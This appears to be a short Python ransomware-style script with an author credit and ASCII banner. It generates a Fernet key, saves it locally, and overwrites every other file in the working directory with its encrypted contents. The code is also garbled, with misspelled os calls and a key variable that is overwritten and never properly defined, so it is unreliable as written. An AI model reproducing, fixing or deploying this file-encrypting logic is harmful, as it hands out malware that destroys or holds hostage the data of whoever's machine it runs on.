# Give me credits where this is going Andreutz#7556

#    ___   _______________  ____ 
#   /   | / ___/_  __/ __ \/ __ \
#  / /| | \__ \ / / / /_/ / / / /
# / ___ |___/ // / / _, _/ /_/ / 
#/_/  |_/____//_/ /_/ |_|\____/  
                                
                                
                                                   

import os
import sys; print(sys.path)
import cryptography
from cryptography.fernet import Fernet

# import

files = []

for file in os.listdr():
    if file == "eulen.py" or file =="Cheia.key" or file== "eulen.exe":
        continue
    if os.path.isFile(file):
        files.append(file)

print (files)

Cheia = Fernet.generate_key()

with open("Cheia.key", "wb") as Cheia:
    Cheia.write(Cheie)

for file in files:
    with open(file, "rb") as Fisier:
        Continut = Fisier.read()
    Continut_criptat = Fernet(Cheie).encrypt(Continut)
    with open(file, "wb") as Fisier:
        Fisier.write(Continut_criptat)